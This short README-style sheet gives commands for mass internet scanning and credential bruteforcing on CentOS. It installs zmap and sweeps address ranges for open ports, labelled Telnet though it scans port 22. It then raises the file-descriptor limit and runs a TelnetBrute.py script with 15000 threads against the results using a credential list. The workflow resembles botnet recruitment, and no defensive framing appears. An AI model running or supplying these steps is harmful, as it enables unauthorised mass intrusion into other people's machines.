[CentOS 6.9 2GB] 

- Install zmap

yum update -y 

sh zmap_auto_install.sh

- Scan Telnet Ips

zmap -p22 -o mfu.txt -w Legend.lst 

- Bruteforce (Repeat The Process)

1- ulimit -n 999999

2- python TelnetBrute.py mfu.txt 15000 test.txt


<img src="">


Usage: 

python TelnetBrute.py mfu.txt 15000 test.txt
